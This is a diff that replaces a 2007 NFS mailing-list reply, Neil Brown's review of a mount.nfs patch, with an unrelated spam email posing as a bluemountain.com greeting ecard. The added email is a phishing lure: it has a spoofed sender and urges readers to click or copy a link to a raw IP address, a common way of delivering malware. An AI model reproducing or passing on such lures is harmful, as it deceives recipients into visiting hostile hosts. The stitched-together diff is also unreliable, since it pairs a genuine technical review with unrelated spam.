@@ -1,24 +1,19 @@
-From: Neil Brown <neilb@suse.de>
-Subject: Re: [PATCH 04/17] mount.nfs: /bin/mount already handles
-	--bind & friends
-Date: Mon, 16 Jul 2007 13:44:29 +1000
-Message-ID: <18074.59805.866117.453406@notabene.brown>
-References: <20070716031509.11209.35069.stgit@manray.1015granger.net>
+From: "bluemountain.com" <olxp@unilever.com>
+Subject: You've received a greeting ecard from a Class mate!
+Date: Fri, 6 Jul 2007 23:52:46 +0300
+Message-ID: <002b01c7c00f$9b7c5e50$3162ba88@arpxe.duj>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
-Cc: nfs@lists.sourceforge.net
-To: Chuck Lever <chuck.lever@oracle.com>
+To: <nfs@lists.sourceforge.net>
 Return-path: <nfs-bounces@lists.sourceforge.net>
 Received: from sc8-sf-mx2-b.sourceforge.net ([10.3.1.92]
 	helo=mail.sourceforge.net)
 	by sc8-sf-list2-new.sourceforge.net with esmtp (Exim 4.43)
-	id 1IAHVi-0004qg-5Q
-	for nfs@lists.sourceforge.net; Sun, 15 Jul 2007 20:44:34 -0700
-Received: from mx1.suse.de ([195.135.220.2])
-	by mail.sourceforge.net with esmtps (TLSv1:AES256-SHA:256)
-	(Exim 4.44) id 1IAHVk-0007PX-7m
-	for nfs@lists.sourceforge.net; Sun, 15 Jul 2007 20:44:38 -0700
-In-Reply-To: message from Chuck Lever on Sunday July 15
+	id 1I6unL-00055S-SD
+	for nfs@lists.sourceforge.net; Fri, 06 Jul 2007 13:52:52 -0700
+Received: from [88.226.227.63] (helo=dsl88-226-58175.ttnet.net.tr)
+	by mail.sourceforge.net with smtp (Exim 4.44) id 1I6unN-0008JS-HD
+	for nfs@lists.sourceforge.net; Fri, 06 Jul 2007 13:52:55 -0700
 List-Id: "Discussion of NFS under Linux development, interoperability,
 	and testing." <nfs.lists.sourceforge.net>
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
@@ -31,68 +26,36 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
 Sender: nfs-bounces@lists.sourceforge.net
 Errors-To: nfs-bounces@lists.sourceforge.net
 
-On Sunday July 15, chuck.lever@oracle.com wrote:
-> Clean-up: remove logic to handle --bind and other such options from
-> mount.nfs[4].
-> 
-> These options are already handled in /bin/mount, and the logic for handling
-> them in the NFS helper is currently disabled.  Other helpers such as
-> mount.ocfs2 appear not to support --bind (ie. they rely on /bin/mount to
-> do it).
+Hi. Class mate has sent you a greeting ecard.
+See your card as often as you wish during the next 15 days.
 
-Fair enough - I don't suppose the protocol for how /bin/mount talks to
-/sbin/mount.$fstype is documented anywhere???  I guess just in the
-code :-(
+SEEING YOUR CARD
 
-> 
-> Signed-off-by: Chuck Lever <chuck.lever@oracle.com>
-> ---
-> 
->  utils/mount/mount.c           |   45 +++++------------------------------------
->  utils/mount/mount_constants.h |    6 +++++
->  2 files changed, 11 insertions(+), 40 deletions(-)
-> 
-> diff --git a/utils/mount/mount.c b/utils/mount/mount.c
-> index 337d7cc..c05f907 100644
-> --- a/utils/mount/mount.c
-> +++ b/utils/mount/mount.c
-> @@ -75,11 +67,6 @@ struct opt_map {
->    int  mask;                    /* flag mask value */
->  };
->  
-> -/* Custom mount options for our own purposes.  */
-> -#define MS_DUMMY	0x00000000
-> -#define MS_USERS	0x40000000
-> -#define MS_USER		0x80000000
-> -
->  static const struct opt_map opt_map[] = {
->    { "defaults", 0, 0, 0         },      /* default options */
->    { "ro",       1, 0, MS_RDONLY },      /* read-only */
-> diff --git a/utils/mount/mount_constants.h b/utils/mount/mount_constants.h
-> index 19a7bf5..3e40841 100644
-> --- a/utils/mount/mount_constants.h
-> +++ b/utils/mount/mount_constants.h
-> @@ -39,6 +39,12 @@ if we have a stack or plain mount - mount atop of it, forming a stack. */
->  #ifndef MS_VERBOSE
->  #define MS_VERBOSE	0x8000	/* 32768 */
->  #endif
-> +
-> +/* Custom mount options for our own purposes.  */
-> +#define MS_DUMMY	0x00000000
-> +#define MS_USERS	0x40000000
-> +#define MS_USER		0x80000000
-> +
->  /*
->   * Magic mount flag number. Had to be or-ed to the flag values.
->   */
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
-Hmmm.  That wasn't mentioned in the change-log, and I don't find it
-convincing.
-These flags are for internal use in mount.c so it makes lots of sense
-to define them in mount.c so that the definitions never leak.
-Did you have a concrete reason for moving them?
+http://76.108.229.252/?3e5bea6509ee64d82c3a9ebeed
 
-NeilBrown
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
+
+
+PRIVACY
+bluemountain.com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
+
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Webmaster,
+bluemountain.com
+
 
 -------------------------------------------------------------------------
 This SF.net email is sponsored by DB2 Express
